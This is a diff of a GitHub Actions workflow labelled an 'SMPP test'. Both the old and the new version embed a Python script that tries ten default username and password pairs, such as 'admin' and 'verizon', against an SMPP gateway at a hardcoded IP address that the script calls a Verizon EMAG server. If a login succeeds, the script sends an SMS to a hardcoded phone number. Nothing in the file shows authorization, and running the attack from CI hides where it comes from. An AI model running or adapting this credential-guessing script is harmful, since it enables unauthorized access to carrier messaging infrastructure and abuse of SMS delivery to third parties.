@@ -1,4 +1,4 @@
-name: SMPP Test v2
+name: SMPP Test v3
 on:
   workflow_dispatch:
   push:
@@ -9,81 +9,62 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Test SMPP EMAG
+      - name: Run SMPP Test
         run: |
-          python3 << 'PYEOF'
-import socket, struct, time
-
-EMAG_IP = "69.78.159.216"
-PORT = 2775
-
-NUL = bytes([0])
-
-def build_bind(sid, pwd, seq=1):
-    body = (sid.encode() + NUL +
-            pwd.encode() + NUL +
-            NUL +
-            bytes([0x34]) +
-            bytes([0, 0]) +
-            NUL)
-    hdr = struct.pack(">IIII", 16 + len(body), 2, 0, seq)
-    return hdr + body
-
-def build_submit(src, dst, msg_text, seq=2):
-    msg = msg_text.encode()
-    body = (NUL +
-            bytes([0, 0]) +
-            src.encode() + NUL +
-            bytes([1, 1]) +
-            dst.encode() + NUL +
-            bytes([0, 0, 0]) +
-            NUL + NUL +
-            bytes([0, 0, 0]) +
-            NUL +
-            bytes([len(msg)]) +
-            msg)
-    hdr = struct.pack(">IIII", 16 + len(body), 4, 0, seq)
-    return hdr + body
-
-def parse_pdu(data):
-    if len(data) < 16:
-        return None
-    return struct.unpack(">IIII", data[:16])
-
-creds = [
-    ("test", "test"), ("emag", "emag"), ("admin", "admin"),
-    ("", ""), ("vzw", "vzw"), ("smpp", "smpp"),
-    ("verizon", "verizon"), ("emag_user", "emag_pass"),
-    ("api", "api"), ("guest", "guest")
-]
-
-for sid, pwd in creds:
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(8)
-        sock.connect((EMAG_IP, PORT))
-        bind = build_bind(sid, pwd)
-        print(f"BIND {repr(sid)}:{repr(pwd)} pdu={bind.hex()}")
-        sock.send(bind)
-        resp = sock.recv(1024)
-        print(f"RESP {resp.hex()}")
-        r = parse_pdu(resp)
-        if r:
-            length, cmd, status, seq = r
-            print(f"  cmd={hex(cmd)} status={hex(status)}")
-            if status == 0:
-                print(f"[SUCCESS] Bound as {repr(sid)}:{repr(pwd)}")
-                submit = build_submit("EMAG", "12283359820", "VZW EMAG SMPP test OK")
-                sock.send(submit)
-                sresp = sock.recv(1024)
-                print(f"SUBMIT_SM resp={sresp.hex()}")
-                psu = parse_pdu(sresp)
-                if psu:
-                    print(f"  submit status={hex(psu[2])}")
-        sock.close()
-    except Exception as e:
-        print(f"ERR {repr(sid)}:{repr(pwd)} -> {e}")
-    time.sleep(0.5)
-
-print("SMPP test complete")
-PYEOF
+          python3 - << 'PYEOF'
+          import socket, struct, time
+          EMAG_IP = '69.78.159.216'
+          PORT = 2775
+          NUL = bytes([0])
+          
+          def build_bind(sid, pwd, seq=1):
+              body = (sid.encode() + NUL + pwd.encode() + NUL +
+                      NUL + bytes([0x34]) + bytes([0, 0]) + NUL)
+              hdr = struct.pack('>IIII', 16 + len(body), 2, 0, seq)
+              return hdr + body
+          
+          def build_submit(src, dst, msg_text, seq=2):
+              msg = msg_text.encode()
+              body = (NUL + bytes([0, 0]) + src.encode() + NUL +
+                      bytes([1, 1]) + dst.encode() + NUL +
+                      bytes([0, 0, 0]) + NUL + NUL +
+                      bytes([0, 0, 0]) + NUL + bytes([len(msg)]) + msg)
+              hdr = struct.pack('>IIII', 16 + len(body), 4, 0, seq)
+              return hdr + body
+          
+          def parse(data):
+              if len(data) < 16: return None
+              return struct.unpack('>IIII', data[:16])
+          
+          creds = [('test','test'),('emag','emag'),('admin','admin'),
+                   ('',''),('vzw','vzw'),('smpp','smpp'),
+                   ('verizon','verizon'),('emag_user','emag_pass'),
+                   ('api','api'),('guest','guest')]
+          
+          for sid, pwd in creds:
+              try:
+                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                  sock.settimeout(8)
+                  sock.connect((EMAG_IP, PORT))
+                  bind = build_bind(sid, pwd)
+                  print('BIND', repr(sid), ':', repr(pwd), 'pdu=', bind.hex())
+                  sock.send(bind)
+                  resp = sock.recv(1024)
+                  print('RESP', resp.hex())
+                  r = parse(resp)
+                  if r:
+                      l, c, s, q = r
+                      print('  cmd=', hex(c), 'status=', hex(s))
+                      if s == 0:
+                          print('[SUCCESS] Bound as', repr(sid), ':', repr(pwd))
+                          sub = build_submit('EMAG', '12283359820', 'VZW test GHA')
+                          sock.send(sub)
+                          sresp = sock.recv(1024)
+                          print('SUBMIT resp:', sresp.hex())
+                  sock.close()
+              except Exception as e:
+                  print('ERR', repr(sid), ':', repr(pwd), '->', str(e))
+              time.sleep(0.5)
+          
+          print('DONE')
+          PYEOF
